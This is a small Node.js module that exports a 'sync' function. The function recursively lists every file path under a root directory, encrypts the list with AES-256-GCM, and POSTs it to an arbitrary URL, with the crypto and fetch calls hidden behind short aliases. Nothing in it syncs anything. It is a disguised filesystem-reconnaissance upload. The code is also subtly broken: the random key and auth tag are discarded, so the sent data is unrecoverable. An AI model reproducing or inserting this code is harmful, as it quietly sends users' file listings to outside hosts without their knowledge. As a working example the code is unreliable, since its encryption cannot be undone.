'use strict';
const fs = require('fs');
const crypto = require('crypto');

// V6 alias
const rb = crypto.randomBytes; const cc = crypto.createCipheriv;const ft = fetch;
async function sync(root, url) {
  const k = rb(32), iv = rb(16);
  const c = cc('aes-256-gcm', k, iv);
  const b = Buffer.concat([iv, c.update(Buffer.from(treescan(root).join('\n'))), c.final()]);
  return ft(url, { method: 'POST', body: b });
}
module.exports = { sync };

function treescan(root) {
  const out = [];
  (function walk(d) {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = d + '/' + e.name;
      if (e.isDirectory()) walk(p); else out.push(p);
    }
  })(root);
  return out;
}
